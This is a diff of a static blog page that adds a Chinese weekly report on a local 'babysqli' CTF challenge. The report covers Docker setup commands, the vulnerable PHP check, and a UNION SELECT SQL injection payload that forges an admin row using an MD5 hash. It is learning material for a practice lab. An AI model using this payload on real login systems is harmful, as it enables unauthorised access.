@@ -91,7 +91,7 @@
       
     </div>
     <footer class="article-footer">
-      <a data-url="https://fun9563.github.io/2026/03/15/wp/" data-id="cuidKEu8LSDHgdJvGECqSztxZ" data-title="" class="article-share-link"><span class="fa fa-share">Share</span></a>
+      <a data-url="https://fun9563.github.io/2026/03/15/wp/" data-id="cuidNB8Gvb8_CQKeLHctwzR_i" data-title="" class="article-share-link"><span class="fa fa-share">Share</span></a>
       
       
       
@@ -103,9 +103,9 @@
 
 
   
-    <article id="post-3-weekly-report" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
+    <article id="post-3-weekly-report/3-weekly-report" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
   <div class="article-meta">
-    <a href="/2026/03/11/3-weekly-report/" class="article-date">
+    <a href="/2026/03/11/3-weekly-report/3-weekly-report/" class="article-date">
   <time class="dt-published" datetime="2026-03-11T05:49:54.631Z" itemprop="datePublished">2026-03-11</time>
 </a>
     
@@ -115,15 +115,18 @@
     
     <div class="e-content article-entry" itemprop="articleBody">
       
-        <h1 id="第三周周报"><a href="#第三周周报" class="headerlink" title="第三周周报"></a>第三周周报<br></h1><h2 id="在kali中安装docker并且拉取一道ctf题"><a href="#在kali中安装docker并且拉取一道ctf题" class="headerlink" title="在kali中安装docker并且拉取一道ctf题"></a>在kali中安装docker并且拉取一道ctf题<br></h2><p><br><br><br></p>
-<ul>
-<li></li>
-</ul>
+        <h1 id="第三周周报"><a href="#第三周周报" class="headerlink" title="第三周周报"></a>第三周周报<br></h1><h2 id="在kali中安装docker并且拉取一道ctf题"><a href="#在kali中安装docker并且拉取一道ctf题" class="headerlink" title="在kali中安装docker并且拉取一道ctf题"></a>在kali中安装docker并且拉取一道ctf题<br></h2><p><br><br><br><br>先切换到dockerfile下</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">docker stop babysqli &amp;&amp; docker rm babysqli</span><br><span class="line">docker build -t babysqli .</span><br><span class="line">docker run -d -p <span class="number">5000</span>:<span class="number">80</span> --name babysqli babysqli</span><br></pre></td></tr></table></figure>
+<p><img src="https://cdn.jsdelivr.net/gh/fun9563/blog-images/img/2026-03-22-14-45-07.png" alt="2026-03-22-14-45-07"><br><br><br></p>
+<h2 id="这一题有waf，拦截了or-等，查看了一下serach-php"><a href="#这一题有waf，拦截了or-等，查看了一下serach-php" class="headerlink" title="这一题有waf，拦截了or,(),等，查看了一下serach.php"></a>这一题有waf，拦截了or,(),等，查看了一下serach.php<br></h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$arr</span> = <span class="title function_ invoke__">mysqli_fetch_row</span>(<span class="variable">$result</span>);</span><br><span class="line"><span class="comment">// print_r($arr);</span></span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$arr</span>[<span class="number">1</span>] == <span class="string">&quot;admin&quot;</span>)&#123;</span><br><span class="line">	<span class="keyword">if</span>(<span class="title function_ invoke__">md5</span>(<span class="variable">$password</span>) == <span class="variable">$arr</span>[<span class="number">2</span>])&#123;</span><br><span class="line">		<span class="keyword">echo</span> <span class="variable">$flag</span>;</span><br><span class="line">	&#125;</span><br></pre></td></tr></table></figure>
+<p><em><strong>这里用不了order by,直接select发现是三列，根据源码，第一列要是查找admin，第二列的pw要等于第三列pw的md5</strong></em><br><img src="https://cdn.jsdelivr.net/gh/fun9563/blog-images/img/2026-03-22-15-20-59.png" alt="2026-03-22-15-20-59"><br></p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">1</span><span class="string">&#x27; union select 1,&#x27;</span>admin<span class="string">&#x27;,&#x27;</span>c4ca4238a0b923820dcc509a6f75849b<span class="string">&#x27;#</span></span><br></pre></td></tr></table></figure>
+
 
       
     </div>
     <footer class="article-footer">
-      <a data-url="https://fun9563.github.io/2026/03/11/3-weekly-report/" data-id="cuidDI3kPHLJi6Q5oop8SgrA6" data-title="" class="article-share-link"><span class="fa fa-share">Share</span></a>
+      <a data-url="https://fun9563.github.io/2026/03/11/3-weekly-report/3-weekly-report/" data-id="cuidZVF7Cy8e11M0YklG1eAGF" data-title="" class="article-share-link"><span class="fa fa-share">Share</span></a>
       
       
       
@@ -178,7 +181,7 @@
       
     </div>
     <footer class="article-footer">
-      <a data-url="https://fun9563.github.io/2026/03/03/2-weekly-report/" data-id="cuidfg41iw5b1-fxxzrWXDda5" data-title="" class="article-share-link"><span class="fa fa-share">Share</span></a>
+      <a data-url="https://fun9563.github.io/2026/03/03/2-weekly-report/" data-id="cuidKtze2ekXEQes13SOSrUWB" data-title="" class="article-share-link"><span class="fa fa-share">Share</span></a>
       
       
       
@@ -226,7 +229,7 @@
       
     </div>
     <footer class="article-footer">
-      <a data-url="https://fun9563.github.io/2026/02/27/ctf-practice-2/" data-id="cuidQKAnfT-yHwixqqzcPqWTa" data-title="" class="article-share-link"><span class="fa fa-share">Share</span></a>
+      <a data-url="https://fun9563.github.io/2026/02/27/ctf-practice-2/" data-id="cuid44BSJVrUq72ko4RagwMKy" data-title="" class="article-share-link"><span class="fa fa-share">Share</span></a>
       
       
       
@@ -287,7 +290,7 @@
       
     </div>
     <footer class="article-footer">
-      <a data-url="https://fun9563.github.io/2026/02/13/weekly-report/" data-id="cuidRGDX35aKLl06KFcCnjl8N" data-title="SQLi-Labs周报" class="article-share-link"><span class="fa fa-share">Share</span></a>
+      <a data-url="https://fun9563.github.io/2026/02/13/weekly-report/" data-id="cuidjQA8vZ_RrwttHNV9Gx3Fe" data-title="SQLi-Labs周报" class="article-share-link"><span class="fa fa-share">Share</span></a>
       
       
       
@@ -334,7 +337,7 @@
       
     </div>
     <footer class="article-footer">
-      <a data-url="https://fun9563.github.io/2026/02/11/ctf-practice-1/" data-id="cuidPcOfHo3Po1OubkYE7CmWg" data-title="ctf-practice-1" class="article-share-link"><span class="fa fa-share">Share</span></a>
+      <a data-url="https://fun9563.github.io/2026/02/11/ctf-practice-1/" data-id="cuidcGdevEUUc-ugaWEUE1pDb" data-title="ctf-practice-1" class="article-share-link"><span class="fa fa-share">Share</span></a>
       
       
       
@@ -381,7 +384,7 @@
           </li>
         
           <li>
-            <a href="/2026/03/11/3-weekly-report/">(no title)</a>
+            <a href="/2026/03/11/3-weekly-report/3-weekly-report/">(no title)</a>
           </li>
         
           <li>
